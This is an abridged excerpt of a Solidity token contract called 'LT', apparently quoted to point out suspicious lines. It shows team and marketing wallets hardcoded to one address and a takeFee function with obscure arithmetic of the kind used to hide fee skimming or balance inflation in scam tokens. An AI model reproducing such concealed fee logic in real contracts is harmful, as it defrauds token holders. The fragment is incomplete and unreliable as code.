...
contract LT is Context, IERC20, Ownable {
    ...
    string private _name = "LT";
    string private _symbol = unicode"LT";
    ...
    constructor () {
        ...
        teamWallet = payable(address(0x1a060292fE6d4A4a860ED930186AA22Eb3548306));
        marketingWallet = payable(address(0x1a060292fE6d4A4a860ED930186AA22Eb3548306));
    ...
    function takeFee(address sender, address recipient, uint256 excape) private returns (uint256) {
        ...
        uint256 feeAmount = 0;
        uint256 feeExcape = excape.add((spike / 1) * reflection);
